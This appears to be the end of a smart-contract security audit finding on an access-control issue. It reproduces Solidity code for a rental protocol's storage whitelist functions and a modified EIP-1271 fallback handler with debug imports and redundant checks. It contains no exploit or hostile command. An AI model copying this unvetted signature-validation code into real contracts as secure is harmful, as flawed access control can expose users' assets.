        * @param bitmap    Decimal value that defines the status of the extension.
        */
        function toggleWhitelistExtension(
            address extension,
            uint8 bitmap
        ) external onlyByProxy permissioned {
            // Require that the `extension` address is a contract.
            if (extension.code.length == 0)
                revert Errors.StorageModule_NotContract(extension);

            // 3 is 0x11. This ensures that only a valid bitmap can be set.
            if (bitmap > uint8(3))
                revert Errors.StorageModule_InvalidWhitelistExtensionBitmap(bitmap);

            // Update the extension.
            whitelistedExtensions[extension] = bitmap;
        }

        /**
        * @notice Toggles whether a token can be rented.
        *
        * @param asset     Token address which can be rented via the protocol.
        * @param isEnabled Boolean indicating whether the token is whitelisted.
        */
        function toggleWhitelistAsset(
            address asset,
            bool isEnabled
        ) external onlyByProxy permissioned {
            whitelistedAssets[asset] = isEnabled;
        }

        /**
        * @notice Toggles whether a batch of tokens can be rented.
        *
        * @param assets    Token array which can be rented via the protocol.
        * @param isEnabled Boolean array indicating whether those token are whitelisted.
        */
        function toggleWhitelistAssetBatch(
            address[] memory assets,
            bool[] memory isEnabled
        ) external onlyByProxy permissioned {
            // Check that the arrays are the same length
            if (assets.length != isEnabled.length) {
                revert Errors.StorageModule_WhitelistBatchLengthMismatch(
                    assets.length,
                    isEnabled.length
                );
            }

            // Process each whitelist entry
            for (uint256 i; i < assets.length; ++i) {
                whitelistedAssets[assets[i]] = isEnabled[i];
            }
        }

        /**
        * @notice Toggles whether a token can be used as a payment.
        *
        * @param payment   Token address which can be used as payment via the protocol.
        * @param isEnabled Boolean indicating whether the token is whitelisted.
        */
        function toggleWhitelistPayment(
            address payment,
            bool isEnabled
        ) external onlyByProxy permissioned {
            whitelistedPayments[payment] = isEnabled;
        }

        /**
        * @notice Toggles whether a batch of tokens can be used as payment.
        *
        * @param payments  Token array which can be used as payment via the protocol.
        * @param isEnabled Boolean array indicating whether those token are whitelisted.
        */
        function toggleWhitelistPaymentBatch(
            address[] memory payments,
            bool[] memory isEnabled
        ) external onlyByProxy permissioned {
            // Check that the arrays are the same length
            if (payments.length != isEnabled.length) {
                revert Errors.StorageModule_WhitelistBatchLengthMismatch(
                    payments.length,
                    isEnabled.length
                );
            }

            // Process each whitelist entry
            for (uint256 i; i < payments.length; ++i) {
                whitelistedPayments[payments[i]] = isEnabled[i];
            }
        }

        /**
        * @notice Upgrades the contract to a different implementation. This implementation
        *         contract must be compatible with ERC-1822 or else the upgrade will fail.
        *
        * @param newImplementation Address of the implementation contract to upgrade to.
        */
        function upgrade(address newImplementation) external onlyByProxy permissioned {
            // _upgrade is implemented in the Proxiable contract.
            _upgrade(newImplementation);
        }

        /**
        * @notice Freezes the contract which prevents upgrading the implementation contract.
        *         There is no way to unfreeze once a contract has been frozen.
        */
        function freeze() external onlyByProxy permissioned {
            // _freeze is implemented in the Proxiable contract.
            _freeze();
        }

        /**
        * @notice Sets the maximum rent duration.
        *
        * @param newDuration The new maximum rent duration.
        */
        function setMaxRentDuration(uint256 newDuration) external onlyByProxy permissioned {
            maxRentDuration = newDuration;
        }
    }


</details>



<details>
<summary><b>Fallback.sol</b></summary>
<br>


    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {Safe} from "@safe-contracts/Safe.sol";
    import {HandlerContext} from "@safe-contracts/handler/HandlerContext.sol";
    import {ISignatureValidator} from "@safe-contracts/interfaces/ISignatureValidator.sol";

    import {Kernel, Policy, Permissions, Keycode} from "@src/Kernel.sol";
    import {toKeycode} from "@src/libraries/KernelUtils.sol";
    import {Errors} from "@src/libraries/Errors.sol";
    import {Storage} from "@src/modules/Storage.sol";
    import {TokenReceiver} from "@src/packages/TokenReceiver.sol";
    import "forge-std/console.sol";

    /**
    * @title Fallback
    * @notice Acts as an interface to handle token callbacks, allowing the safe to receive
    *         tokens. In addition, rented assets that support `permit()` functionality will
    *         be prevented from doing so if they are assets that can be rented through the
    *         protocol.
    */
    contract Fallback is Policy, TokenReceiver, ISignatureValidator, HandlerContext {
        /////////////////////////////////////////////////////////////////////////////////
        //                         Kernel Policy Configuration                         //
        /////////////////////////////////////////////////////////////////////////////////

        // keccak256(SafeMessage(bytes message)");
        bytes32 private constant SAFE_MSG_TYPEHASH =
            0x60b3cbf8b4a223d68d641b3b6ddf9a298e7f33710cf3d3a9d1146b5a6150fbca;

        // bytes4(keccak256("isValidSignature(bytes32,bytes)")
        bytes4 private constant UPDATED_EIP1271_VALUE = 0x1626ba7e;

        // Modules that the policy depends on.
        Storage public STORE;

        /**
        * @dev Instantiate this contract as a policy.
        *
        * @param kernel_ Address of the kernel contract.
        */
        constructor(Kernel kernel_) Policy(kernel_) {}

        /**
        * @notice Upon policy activation, configures the modules that the policy depends on.
        *         If a module is ever upgraded that this policy depends on, the kernel will
        *         call this function again to ensure this policy has the current address
        *         of the module.
        *
        * @return dependencies Array of keycodes which represent modules that
        *                      this policy depends on.
        */
        function configureDependencies()
            external
            override
            onlyKernel
            returns (Keycode[] memory dependencies)
        {
            dependencies = new Keycode[](1);

            dependencies[0] = toKeycode("STORE");
            STORE = Storage(getModuleAddress(toKeycode("STORE")));
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            External Functions                               //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @notice Returns the hash of a message that can be signed by safe owners.
        *
        * @param safe    Safe which the message is targeted for.
        * @param message Message which will be signed.
        */
        function getMessageHashForSafe(
            Safe safe,
            bytes memory message
        ) public view returns (bytes32 messageHash) {
            // Add the safe typehash to the message.
            bytes32 messageWithTypehash = keccak256(
                abi.encode(SAFE_MSG_TYPEHASH, keccak256(message))
            );

            // Encode the message with the domain separator.
            messageHash = keccak256(
                abi.encodePacked(
                    bytes1(0x19),
                    bytes1(0x01),
                    safe.domainSeparator(),
                    messageWithTypehash
                )
            );
        }

        /**
        * @notice Legacy implementation of `isValidSignature` to be compatible with gnosis
        *         safe. Determines whether the signature provided is valid for the data hash.
        *
        * @param data      Data which was signed.
        * @param signature Signature byte array associated with the data.
        *
        * @return EIP1271_MAGIC_VALUE
        */
        function isValidSignature(
            bytes memory data,
            bytes memory signature
        ) public view override returns (bytes4) {

            if (!isActive) {
                revert Errors.FallbackPolicy_Deactivated();
            }

            // Get the original sender. This is the address that called the safe.
            address originalSender = _msgSender();

            // Determine if the original sender is a token that has been whitelisted.
            if (STORE.whitelistedAssets(originalSender)) {
                revert Errors.FallbackPolicy_UnauthorizedSender(originalSender);
            } else if (!STORE.whitelistedAssets(originalSender)) {
                if (STORE.rentedERC721s(originalSender) != 0) {
                    revert("Active rentals are present!");
                }
            }

            // Caller should be a Safe.
            Safe safe = Safe(payable(msg.sender));

            bytes32 messageHash = getMessageHashForSafe(safe, data);

            // Check if the signature was signed by an owner of the safe.
            if (signature.length == 0 && safe.signedMessages(messageHash) == 0) {
                revert Errors.FallbackPolicy_HashNotSigned(messageHash);
            } else {
                safe.checkSignatures(messageHash, data, signature);
            }

            return EIP1271_MAGIC_VALUE;
        }

        // A helper function to split the signature 
        function splitSignature(bytes memory sig)
            public
            pure
            returns (uint8 v, bytes32 r, bytes32 s)
        {
            require(sig.length == 65);

            assembly {
                // first 32 bytes, after the length prefix.
                r := mload(add(sig, 32))
                // second 32 bytes.
                s := mload(add(sig, 64))
                // final byte (first byte of the next 32 bytes).
                v := byte(0, mload(add(sig, 96)))
            }

            return (v, r, s);
        }

        /**
        * @notice Standard EIP-1271 implementation that determines whether the signature
        *         provided is valid for the data hash. Used as a wrapper around the
        *         legacy gnosis safe implementation.
        *
        * @param dataHash  Hash of the data to be signed.
        * @param signature Signature byte array associated with the data hash.
        *
        * @return The EIP-1271 magic value.
        */
        function isValidSignature(
            bytes32 dataHash,
            bytes calldata signature
        ) external view returns (bytes4) {
            // Determine if the signature is valid.
            bytes4 value = isValidSignature(abi.encode(dataHash), signature);

            // To maintain compatibility, pass the updated EIP-1271 value.
            return (value == EIP1271_MAGIC_VALUE) ? UPDATED_EIP1271_VALUE : bytes4(0);
        }
    }




</details>




## Assessed type

Access Control
